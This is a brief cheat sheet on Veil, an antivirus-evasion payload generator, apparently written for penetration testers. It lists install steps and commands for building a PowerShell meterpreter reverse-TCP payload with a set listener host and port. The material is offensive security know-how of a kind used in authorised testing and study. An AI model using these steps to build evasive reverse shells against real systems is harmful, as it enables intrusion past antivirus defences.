# Veil

**Type:** Payload Generator
**Purpose:** AV-evasion payload generation framework
**Platform:** Linux
**Tags:** #payloads #av-evasion #metasploit #shellcode #obfuscation

---

## Installation

```bash
git clone https://github.com/Veil-Framework/Veil.git
cd Veil
./config/setup.sh --force --silent
```

---

## Quick Reference

```bash
# Start Veil
./Veil.py

# Use Evasion module
use evasion

# List payloads
list

# Select payload
use powershell/meterpreter/rev_tcp

# Set options
set LHOST 10.10.10.10
set LPORT 4444

# Generate
generate
```

---

## Payload Types

- PowerShell payloads
- Python payloads
- C# payloads
- Go payloads
- Ruby payloads

All designed to evade AV detection

---

## Pro Tips

💡 **AV Evasion**: Focuses on bypassing antivirus
💡 **Multiple Languages**: Supports many payload types
💡 **Metasploit Integration**: Works with MSF payloads
💡 **Regular Updates**: AV signatures change, keep updated

---

## Resources

- GitHub: https://github.com/Veil-Framework/Veil
- Veil-Framework Organization
